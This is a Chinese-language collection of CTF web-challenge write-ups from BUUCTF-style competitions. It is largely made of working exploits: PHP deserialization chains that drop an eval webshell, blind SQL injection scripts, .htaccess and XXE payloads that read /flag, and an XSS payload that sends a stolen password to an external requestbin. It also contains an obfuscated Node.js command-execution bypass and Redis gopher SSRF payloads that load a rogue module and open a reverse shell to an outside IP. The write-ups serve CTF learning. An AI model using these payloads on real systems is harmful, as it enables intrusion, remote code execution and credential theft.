&#39;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;&#39;; $this-&gt;options[&#39;data_compress&#39;] &#x3D; false; &#125; &#125; echo urlencode(serialize(new A())); &#x2F;&#x2F;O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A3%3A%7Bs%3A9%3A%22serialize%22%3Bs%3A4%3A%22trim%22%3Bs%3A6%3A%22prefix%22%3Bs%3A50%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3Bi%3A0%3Bs%3A8%3A%22autosave%22%3Bb%3A0%3Bs%3A8%3A%22complete%22%3Bs%3A39%3A%22xxxPD9waHAgQGV2YWwoJF9QT1NUWyJhIl0pOz8%2B%22%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7D%7D 另一种解法 让 $b &#x3D; new B(); $b-&gt;writeTimes &#x3D; 0; $b -&gt; options &#x3D; array(&#39;serialize&#39; &#x3D;&gt; &quot;system&quot;, &#39;data_compress&#39; &#x3D;&gt; false, &#39;prefix&#39; &#x3D;&gt; &quot;b&quot;); $a &#x3D; new A($store &#x3D; $b, $key &#x3D; &quot;.php&quot;, $expire &#x3D; 0); $a-&gt;autosave &#x3D; false; $a-&gt;cache &#x3D; array(); $a-&gt;complete &#x3D; &#39;&#96;cat &#x2F;flag &gt; .&#x2F;flag.php&#96;&#39; echo urlencode(serialize($a)); 相当于 执行 system(&#39;[[],&quot;&#96;cat &#x2F;flag &gt; .&#x2F;flag.php&#96;&quot;]&#39;) 在shell里执行的时候 反引号 的优先级是高于引号的，所以会先执行cat /flag &gt; ./flag.php，flag就被写到flag.php里面去了 EIS 2019]EzPOP的多种解-SecIN (sec-in.com) 这个好像是根据thinkphp6.0的链子出的题 Thinkphp 6.0 新的Gadget - 安全客，安全资讯平台 (anquanke.com) [极客大挑战 2020]Greatphp&lt;?php error_reporting(0); class SYCLOVER &#123; public $syc; public $lover; public function __wakeup()&#123; if( ($this-&gt;syc !&#x3D; $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) &#x3D;&#x3D;&#x3D; md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)&#x3D;&#x3D;&#x3D; sha1($this-&gt;lover)) )&#123; if(!preg_match(&quot;&#x2F;\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#39;&#x2F;&quot;, $this-&gt;syc, $match))&#123; eval($this-&gt;syc); &#125; else &#123; die(&quot;Try Hard !!&quot;); &#125; &#125; &#125; &#125; if (isset($_GET[&#39;great&#39;]))&#123; unserialize($_GET[&#39;great&#39;]); &#125; else &#123; highlight_file(__FILE__); &#125; ?&gt; 其实看起来很简单，利用数组绕过if判断然后可以利用反引号什么的执行命令 但是唯一的问题在于eval不能执行数组中的命令 所以这里要用Error类当当作字符串的时候会触发toString函数导致XSS 可以看到当作字符串时返回的内容会以字符串的形式输出当前报错，包含当前的错误信息（payload）以及当前报错的行号（2），而传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来，但其本身其实并不一样，所以可以利用这个来绕过sha1和md5的比较 最后就是构造我们的payload 这里因为引号和括号都被过滤了，所以采用取反的方式，至于最后添加的?&gt;是为了使整个命令闭合(?应该 其实更严谨一点要用?&gt;&lt;?=include ?&gt;这种 事实上$str &#x3D; &quot;?&gt;&lt;?&#x3D;include~&quot;.urldecode(&quot;%d0%99%93%9e%98&quot;).&quot;?&gt;&quot;;之后，我在本地把$this-&gt;syc输出出来的内容前面一部分是Error: ?&gt;&lt;?&#x3D;include~Й���; in +报错路径这种，我本来觉得?&gt;的效果是把命令和没有用的报错分开，但这里如果去掉前面的?&gt;&lt;?&#x3D;还是可以拿到flag，但是为什么去掉后面的?&gt;就不行了呢，而且把后面的?&gt;用分号代替也不行,好怪啊 [SWPU2019]Web4好烦sql注入 先是预处理的堆叠注入 prepare stmt_name from preparable_stmt; execute stmt_name [using @var_name [, @var_name] ...]; &#123;deallocate | drop&#125; prepare stmt_name; 还是个时间盲注 过滤了一些关键字，可以用十六进制来绕过 抄个脚本 #author: c1e4r import requests import json import time def main(): #题目地址 url &#x3D; &#39;&#39;&#39;http:&#x2F;&#x2F;ed59e513-784d-42b5-81d0-2c4dc976d086.node3.buuoj.cn&#x2F;index.php?r&#x3D;Login&#x2F;Index&#39;&#39;&#39; #注入payload payloads &#x3D; &quot;admin&#39;;set @a&#x3D;0x&#123;0&#125;;prepare b from @a;execute b--+&quot; flag &#x3D; &#39;&#39; for i in range(1,30): #查询payload payload &#x3D; &quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))&#x3D;&#123;1&#125;,sleep(3),1)&quot; for j in range(0,128): #将构造好的payload进行16进制转码和json转码 datas &#x3D; &#123;&#39;username&#39;:payloads.format(str_to_hex(payload.format(i,j))),&#39;password&#39;:&#39;test213&#39;&#125; data &#x3D; json.dumps(datas) times &#x3D; time.time() res &#x3D; requests.post(url &#x3D; url, data &#x3D; data) if time.time() - times &gt;&#x3D; 3: flag &#x3D; flag + chr(j) print(flag) break def str_to_hex(s): return &#39;&#39;.join([hex(ord(c)).replace(&#39;0x&#39;, &#39;&#39;) for c in s]) if __name__ &#x3D;&#x3D; &#39;__main__&#39;: main() 扫到最后能发现是glzjin_wants_a_girl_friend.zip 应该是源码文件，下载下来审计一下 这里如果$viewDate可控，就能达到变量覆盖的目的 extract 传入 viewdata 数组造成变量覆盖，发现利用 loadView 方法的并且第二个元素可控的地方只有**UserController.php** 在UserController.php中 $listData是从REQUEST提取出来的，完全可控。 在 userIndex.php 文件里 我们可以通过变量覆盖img_file这个变量达到文件包含flag文件的目的 在fun.php显示了路由控制的部分 所以最后的payload就是 r=User/Index&amp;img_file=/../flag.php 这里的路径不能直接../flag.php是因为**dirname(__FILE__)**返回的路径是类似C:/root/www/b.php这种，所以要用/../flag.php [CISCN2019 华东南赛区]Web4一个长着ssrf壳的Flask session伪造 可以看到在/flag路由下需要对session进行一个检查，我们先看一下当前的session 里面的base64解码内容是www-data 我们需要构造成fuck 但是flask的session构造需要一个密钥 题目里的密钥是随机的 但只要有种子，就能得到伪随机数的内容 这里的seed使用的uuid.getnode()的值 这是是网卡mac地址的十进制数，储存路径为 /sys/class/net/（对应网卡）/address //一般都是eth0 得到数值为 187154010911467 然后跑随机数 import random random.seed(187154010911467) print(str(random.random()*233)) 这里有个坑 题目环境是python2，然后会给随机数的后几位四舍五入，所以如果用python3跑拿不到正确的key python2 ： 147.299990175 python3 ：147.299990174972 然后就是用flask-session-cookie-manager-master.py来伪造session 先拿到原本的格式 然后修改内容后加密 (这里有几个csdn的wp上的key带了引号，但是我试的时候发现带了引号拿到的值没法访问flag) 改一下session然后访问/flag路由就行了 [Black Watch 入群题]Web又是个sql的盲注。。。 注入点在热点的id上 直接上脚本了 from time import sleep import requests flag &#x3D; &#39;&#39; url &#x3D; &#39;http:&#x2F;&#x2F;5e09d480-4e60-4c83-86e7-50a897fd3c8f.node4.buuoj.cn:81&#x2F;backend&#x2F;content_detail.php?id&#x3D;1&#39; payload &#x3D; &#39;^(ord(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39; #news payload1 &#x3D; &#39;^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;\\&#39;news\\&#39;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39; #admin,content payload2 &#x3D; &#39;^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;\\&#39;admin\\&#39;)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;#admin表里有id,username,password,is_enable contents表里有id,title,content,is_enable payload3 &#x3D; &#39;^(ord(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;)^1&#39;#username 9e014c86,7385d505 password a40b205c,8d44ad75 for i in range(1,1000): high &#x3D; 137 low &#x3D; 28 mid &#x3D; (high + low) &#x2F;&#x2F; 2 while(low &lt; high): urls &#x3D; url + payload3.format(i,mid) response &#x3D; requests.get(urls) print(low,response.text,mid,high) if &#39;content&#39; in response.text: low &#x3D; mid + 1 else: high &#x3D; mid mid &#x3D; (high + low) &#x2F;&#x2F; 2 #print(mid) sleep(0.2) if chr(mid) &#x3D;&#x3D; &#39;&#39;: break else: flag +&#x3D; chr(mid) print(flag) 输入第二组用户名密码 [SUCTF 2018]annonymous&lt;?php $MY &#x3D; create_function(&quot;&quot;,&quot;die(&#96;cat flag.php&#96;);&quot;); $hash &#x3D; bin2hex(openssl_random_pseudo_bytes(32)); eval(&quot;function SUCTF_$hash()&#123;&quot; .&quot;global \\$MY;&quot; .&quot;\\$MY();&quot; .&quot;&#125;&quot;); if(isset($_GET[&#39;func_name&#39;]))&#123; $_GET[&quot;func_name&quot;](); die(); &#125; show_source(__FILE__); 本来以为是openssl_random_pseudo_bytes这个函数有类似伪随机数的漏洞，看了下wp发现是create_function的问题 create_function()函数在create之后会自动生成一个函数名为%00lambda_[0-999]，后面的数字会逐步递增 前几个试不出来就跑一遍就行 [GXYCTF2019]BabysqliV3.0开局一个长得像sql注入的登陆页面，实际上是弱密码。。。admin/password 上传个文件直接重命名成txt了。。。 然后这里的file参数，试着用伪协议读源码 upload.php &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; &lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt; 上传文件 &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt; &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt; &lt;&#x2F;form&gt; &lt;?php error_reporting(0); class Uploader&#123; public $Filename; public $cmd; public $token; function __construct()&#123; $sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;; $ext &#x3D; &quot;.txt&quot;; @mkdir($sandbox, 0777, true); if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\\&#x2F;\\&#x2F; | filter:\\&#x2F;\\&#x2F; | php:\\&#x2F;\\&#x2F; | \\.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123; $this-&gt;Filename &#x3D; $_GET[&#39;name&#39;]; &#125; else&#123; $this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext; &#125; $this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;; $this-&gt;token &#x3D; $_SESSION[&#39;user&#39;]; &#125; function upload($file)&#123; global $sandbox; global $ext; if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123; $this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;; &#125; else&#123; if($file[&#39;size&#39;] &gt; 1024)&#123; $this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (′▽&#96;〃)&#39;);&quot;; &#125; else&#123; $this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;; &#125; &#125; &#125; function __toString()&#123; global $sandbox; global $ext; &#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext; return $this-&gt;Filename; &#125; function __destruct()&#123; if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123; $this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;; &#125; eval($this-&gt;cmd); &#125; &#125; if(isset($_FILES[&#39;file&#39;])) &#123; $uploader &#x3D; new Uploader(); $uploader-&gt;upload($_FILES[&quot;file&quot;]); if(@file_get_contents($uploader))&#123; echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;; echo file_get_contents($uploader); &#125; &#125; ?&gt; home.php &lt;?php session_start(); echo &quot;&lt;meta http-equiv&#x3D;\\&quot;Content-Type\\&quot; content&#x3D;\\&quot;text&#x2F;html; charset&#x3D;utf-8\\&quot; &#x2F;&gt; &lt;title&gt;Home&lt;&#x2F;title&gt;&quot;; error_reporting(0); if(isset($_SESSION[&#39;user&#39;]))&#123; if(isset($_GET[&#39;file&#39;]))&#123; if(preg_match(&quot;&#x2F;.?f.?l.?a.?g.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123; die(&quot;hacker!&quot;); &#125; else&#123; if(preg_match(&quot;&#x2F;home$&#x2F;i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;&#x2F;upload$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123; $file &#x3D; $_GET[&#39;file&#39;].&quot;.php&quot;; &#125; else&#123; $file &#x3D; $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;; &#125; echo &quot;当前引用的是 &quot;.$file; require $file; &#125; &#125; else&#123; die(&quot;no permission!&quot;); &#125; &#125; ?&gt; 主要还是在upload里 看见这俩函数就直接猜是反序列化了 但是没用反序列化函数，所以应该是phar的反序列化 file_get_contents刚好能触发 file_get_contents() 使 $uploader 通过__toString() 返回 $this-&gt;Filename，$this-&gt;Filename 可控，因此此处 $this-&gt;Filename 用来触发 phar，__destruct() 方法内 eval($this-&gt;cmd); 进行 RCE function __destruct()&#123; if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123; $this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;; &#125; eval($this-&gt;cmd); &#125; 只要$this-&gt;token 和 $_SESSION[&#39;user&#39;] 相等，我们就能执行自己的命令 $_SESSION[&#39;user&#39;]我们在不加name参数的时候上传文件就会作为文件名的一部分 GXYc20516553292cd91851e49f51dda07ef 把得到的路径作为name的值然后随便上传个文件就行 再来看看非预期解 一 因为name参数的值就是文件名，也没过滤php，所以直接让name=1.php传马就得了 二 上传后会显示出 $uploader 这个文件的内容，所以只要使 $this-&gt;Filename 为 flag.php 然后随便传个东西就会得到 flag 了。 （别传带内容的文件，会被覆盖，要用空文件 EasyBypass&lt;?php highlight_file(__FILE__); $comm1 &#x3D; $_GET[&#39;comm1&#39;]; $comm2 &#x3D; $_GET[&#39;comm2&#39;]; if(preg_match(&quot;&#x2F;\\&#39;|\\&#96;|\\\\|\\*|\\n|\\t|\\xA0|\\r|\\&#123;|\\&#125;|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w&#x2F;is&quot;, $comm1)) $comm1 &#x3D; &quot;&quot;; if(preg_match(&quot;&#x2F;\\&#39;|\\&quot;|;|,|\\&#96;|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||ls|\\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w&#x2F;is&quot;, $comm2)) $comm2 &#x3D; &quot;&quot;; $flag &#x3D; &quot;#flag in &#x2F;flag&quot;; $comm1 &#x3D; &#39;&quot;&#39; . $comm1 . &#39;&quot;&#39;; $comm2 &#x3D; &#39;&quot;&#39; . $comm2 . &#39;&quot;&#39;; $cmd &#x3D; &quot;file $comm1 $comm2&quot;; system($cmd); ?&gt; payload ?comm1&#x3D;&quot;;tac &#x2F;fla?;&quot;&amp;comm2&#x3D;1 利用管道符符分割命令，同时在命令前后加双引号进行闭合操作，再用通配符绕过对flag的过滤 [羊城杯2020]easyphp&lt;?php $files &#x3D; scandir(&#39;.&#x2F;&#39;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123; unlink($file); &#125; &#125; &#125; if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) &#123; highlight_file(__FILE__); die(); &#125; $content &#x3D; $_GET[&#39;content&#39;]; if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) &#123; echo &quot;Hacker&quot;; die(); &#125; $filename &#x3D; $_GET[&#39;filename&#39;]; if(preg_match(&quot;&#x2F;[^a-z\\.]&#x2F;&quot;, $filename) &#x3D;&#x3D; 1) &#123; echo &quot;Hacker&quot;; die(); &#125; $files &#x3D; scandir(&#39;.&#x2F;&#39;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123; unlink($file); &#125; &#125; &#125; file_put_contents($filename, $content . &quot;\\nHello, world&quot;); ?&gt; 有file_put_contents，可以试着写php文件进去 发现没有被解析，可能是设置只允许解析index.php 这时候可以尝试使用.htaccess .htaccess 中有 # 单行注释符, 且支持 \\拼接上下两行。(注意后面这个东西很重要) [CTF].htaccess的使用技巧总结_Y4tacker的博客-CSDN博客_.htaccess ctf 可以看一下y4师傅写的这个.htaccess的文章 这个就是我们这道题的关键，因为unlink的限制，我们只被允许写入一个文件，所以只能尝试用.htaccess把自己包含掉 filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil\\%0Ae%20.htaccess%0A%23%3C?php%20system(%27cat%20&#x2F;fla%27.%27g%27);?%3E\\ ?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_append_fil\\%0Ae%20.htaccess%0A%23&lt;?php system(&quot;cat &#x2F;f*&quot;);?&gt;\\ e 两个不太一样的payload，区别在于auto_append_file和auto_prepend_file [GWCTF 2019]mypasswordlogin.js if (document.cookie &amp;&amp; document.cookie != '') &#123; var cookies = document.cookie.split('; '); var cookie = &#123;&#125;; for (var i = 0; i &lt; cookies.length; i++) &#123; var arr = cookies[i].split('='); var key = arr[0]; cookie[key] = arr[1]; &#125; if(typeof(cookie['user']) != \"undefined\" &amp;&amp; typeof(cookie['psw']) != \"undefined\")&#123; document.getElementsByName(\"username\")[0].value = cookie['user']; document.getElementsByName(\"password\")[0].value = cookie['psw']; &#125; &#125; 也就是把用户名和密码都写进了表单里 注册个账户然后登录，可以看到有个类似留言框的东西 源码里还有一些过滤 这里可以用双写绕过，然后这里是可以执行js脚本的 所以这题实际上就类似于一个xss login.js中的记住密码功能会将读取cookie中的password。于是我们可以构造一个登录框并且引入login.js提交反馈等待bot点开获得flag &lt;incookieput type=\"text\" name=\"username\"> &lt;incookieput type=\"password\" name=\"password\"> &lt;scrcookieipt scookierc=\"./js/login.js\">&lt;/scrcookieipt> &lt;scrcookieipt> var pwd = docucookiement.getcookieElementsByName(\"password\")[0].value; docucookiement.locacookietion=\"http://http.requestbin.buuoj.cn/xxx/?a=\"+pwd; &lt;/scrcookieipt> 只要我们写留言，就按前端代码的格式写，用户查看留言的时候留言的代码会嵌入到前端代码里执行。 留言的内容大概是两个&lt;input&gt;标签，分别是username和password，然后&lt;script src=./js/login.js&gt;&lt;/script&gt; 因为管理员查看的时候肯定是有cookie的，就会填充到两个input，然后用javasript的代码获取&lt;input&gt;的value，再用javascript代码 document.location&#x3D;&#96;&#96;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;xxxxxx&#x2F;?a&#x3D;&quot;&#96;&#96;+pwd; 发送到平台上（http.requestbin.buuoj.cn可以看向它请求的http包） [RootersCTF2019]babyWeb已经告诉过滤了那些了 先用order by试一下列数 可以测出有两列，那一列是uniqueid，另一列可能就是flag 两种方式，一种是用万能密码 另一种就是报错注入拿到密码 1 and updatexml(1,concat(0x7e,(select group_concat(uniqueid) from users),0x7e),1) 837461526918364526 做完之后看一下源码 可以看到有个mysqli_num_rows函数来判断返回的行数，若为1才会进入if里面的内容，而在数据库里插入了两条数据 所以这里万能密码后边必须加上limit 0,1才能成功 [DDCTF 2019]homebrew event loop[HFCTF2020]BabyUpload上传session文件伪造session。 [RoarCTF 2019]Simple Uploadthinkphp框架上传文件数组绕过 php 后缀限制。 [GoogleCTF2019 Quals]Bnv通过调用本地dtd使XML报错读取敏感信息 &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;!DOCTYPE message [ &lt;!ELEMENT message ANY > &lt;!ENTITY m \"135601360123502401401250\"> &lt;!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"> &lt;!ENTITY % ISOamsa ' &lt;!ENTITY &amp;#37; flag SYSTEM \"file:///flag\"> &lt;!ENTITY &amp;#37; getflag \"&lt;!ENTITY &amp;#38;#37; test SYSTEM &amp;#39;file:///&amp;#37;flag;&amp;#39;>\"> '> %local_dtd;%getflag;%test; ]> &lt;message>&amp;m;&lt;/message> [NPUCTF2020]ezloginxpath注入 [pasecactf_2019]flask_sstissti注入 [WMCTF2020]Make PHP Great Again 2.0绕过require_once [PASECA2019]honey_shopflask session伪造 [XNUCA2019Qualifier]EasyPHP.htaccess的使用 [GWCTF 2019]你的名字ssti注入 virink_2019_files_share双写任意文件读取 [NESTCTF 2019]Love Math 2利用数学函数和异或构造get语句，执行命令 [RootersCTF2019]ImgXwebjwt伪造 [羊城杯 2020]Easyphp2用管道符和引号闭合命令，实现命令执行，然后su切换用户，或者在环境变量里得到flag 1&#39;|echo &#96;env&#96;||&#39; [BSidesCF 2020]Hurdles一个套到不能再套的http报文修改了 [watevrCTF-2019]Pickle Storepython反序列化 [2020 新春红包题]1php反序列化 [网鼎杯 2020 青龙组]filejavajava的xxe （没做出来，很怪，照抄的payload连dnslog都没有，更别提外带了 [安洵杯 2019]iamthinkingthinkphp的代码审计 [GYCTF2020]Node Gamepug文件的命令执行和nodejs8.0版本导致的切分攻击造成的请求走私 [CISCN2019 总决赛 Day1 Web4]Laravel1Laravel的代码审计，审个反序列化链子出来 [watevrCTF-2019]Supercalc用报错的方式得到secret_key，然后实现伪造session [CSAWQual 2016]i_got_idperl的文件上传，利用了param()函数和&lt;$file&gt;，两个尖括号这种读文件的方式 （很怪，这种源码是怎么猜出来的 param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。 [HarekazeCTF2019]Easy Notes伪造php session [RCTF 2019]NextphpFFI：实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions 是 PHP7.4 中新加入的功能 opcache.preload：/var/www/html/preload.php opcache.preload 是 PHP7.4 中新加入的功能。如果设置了 opcache.preload ，那么在所有Web应用程序运行之前，服务会先将设定的 preload 文件加载进内存中，使这些 preload 文件中的内容对之后的请求均可用。更多细节可以阅读：https://wiki.php.net/rfc/preload ，在这篇文档尾巴可以看到如下描述： 允许在 preload 文件中使用 FFI 拓展 在这个题目里的preload.php内容为 &lt;?php final class A implements Serializable &#123; protected $data &#x3D; [ &#39;ret&#39; &#x3D;&gt; null, &#39;func&#39; &#x3D;&gt; &#39;print_r&#39;, &#39;arg&#39; &#x3D;&gt; &#39;1&#39; ]; private function run () &#123; $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]); &#125; public function __serialize(): array &#123; return $this-&gt;data; &#125; public function __unserialize(array $data) &#123; array_merge($this-&gt;data, $data); $this-&gt;run(); &#125; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data &#x3D; unserialize($payload); $this-&gt;run(); &#125; public function __get ($key) &#123; return $this-&gt;data[$key]; &#125; public function __set ($key, $value) &#123; throw new \\Exception(&#39;No implemented&#39;); &#125; public function __construct () &#123; throw new \\Exception(&#39;No implemented&#39;); &#125; &#125; 然后按照官方文档FFI可以直接执行php语句 &lt;?php $ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;); $ffi-&gt;system(&quot;id &gt; &#x2F;tmp&#x2F;eki&quot;); echo file_get_contents(&quot;&#x2F;tmp&#x2F;eki&quot;); @unlink(&quot;&#x2F;tmp&#x2F;eki&quot;); 所以在这个题里可以利用run方法直接执行命令 &lt;?php final class A implements Serializable &#123; protected $data &#x3D; [ &#39;ret&#39; &#x3D;&gt; null, &#39;func&#39; &#x3D;&gt; &#39;FFI::cdef&#39;, &#39;arg&#39; &#x3D;&gt; &#39;int system(const char *command);&#39; ]; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data &#x3D; unserialize($payload); &#125; &#125; $a &#x3D; new A(); echo serialize($a); 这里对生成的序列化内容进行反序列化后，再调用它的__serialize方法就可以跳到run方法里，run方法里的语句现在就相当于$ffi = FFI::cdef(&quot;int system(const char *command);&quot;); 然后就是$ffi-&gt;system(&quot;id &gt; /tmp/eki&quot;);，也就是 __serialize()[&#39;ret&#39;]-&gt;system(&quot;whoami &gt; /var/www/html/test.txt&quot;); 最终payload为a=$a=unserialize(&#39;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#39;)-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&quot;cat /f*&gt; /var/www/html/test.txt&quot;); 都写到这了，就再说一说其它几种饶过disable_function的方式 https://www.cnblogs.com/karsa/p/13051079.html [FBCTF2019]Eventflask session伪造 [SWPU2019]Web3flask session伪造+文件上传软连接 1.在 linux 中，&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;会指向进程的当前目录，在不知道 flask 工作目录时，我们可以用&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag&#x2F;flag.jpg来访问 flag.jpg。 2.ln -s是Linux的软连接命令,其类似与windows的快捷方式。比如ln -s &#x2F;etc&#x2F;passwd shawroot 这会出现一个名为shawroot的文件,其内容为&#x2F;etc&#x2F;passwd的内容。 这里对有软连接的压缩包解压出的内容就是软连接对应的文件内容 也就说，如果我们使用ln -s /proc/self/cwd/flag/flag.jpg test 然后再对test文件进行压缩 zip -ry test.zip test -r：将指定的目录下的所有子目录以及文件一起处理 -y：直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。 到时候上传到服务器上，服务器进行解压后再显示的内容就也是 /proc/self/cwd/flag/flag.jpg的内容 [网鼎杯 2020 青龙组]notesUndefsafe 模块原型链污染（CVE-2019-10795） &lt; 2.0.3 [HFCTF 2021 Final]easyflask伪造session python反序列化 [PwnThyBytes 2019]Baby_SQL构造PHP_SESSION_UPLOAD_PROGRESS的POST请求。就会自动进行session_start()，从而绕过session的判断 利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户 [HITCON 2016]Leakingnodejs的一个旧版本特性 在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。 所以就直接Buffer(1000)这种去读内存，多读几次就行 [CISCN2019 华东北赛区]Web2使用html markup绕过xss 联合注入 [NPUCTF2020]验证🐎nodejs的弱类型比较 加个命令执行的绕过 Function(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111, 99,101,115,115,46,109,97,105,110,77,111,100,117,108,101, 46,114,101,113,117,105,114,101,40,39,99,104,105,108,100, 95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83, 121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))() (Math&#x3D;&gt;(Math&#x3D;Math.constructor,Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41,46,116,111,83,116,114,105,110,103,40,41))()))(Math+1) 看不懂 我直接爬 [网鼎杯 2020 玄武组]SSRFMeSSRF的简单绕过和redis主从复制漏洞 https://github.com/xmsec/redis-ssrfhttps://github.com/n0b0dyCN/redis-rogue-server 服务器下开启rogue-server.py 启动之后用于伪装为主redis，它开启的端口为6666,注意需要将第二个工具exp.so导入到第一个工具下，也就是和rogue-server.py同目录接下来在web界面利用gopher协议入到从redis之中： gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250aconfig%2520set%2520dir%2520&#x2F;tmp&#x2F;%250d%250aquit gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520174.1.185.67%25206666%250d%250aquit gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth%2520root%250d%250amodule%2520load%2520&#x2F;tmp&#x2F;exp.so%250d%250asystem.rev%2520174.1.185.67%25206663%250d%250aquit 注释 gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_auth root config set dir &#x2F;tmp&#x2F; quit &#x2F;&#x2F;设置备份文件路径为&#x2F;tmp&#x2F; 顺便说一下看到当时大佬的博客说试了很多目录，最后发现只有&#x2F;tmp有权限 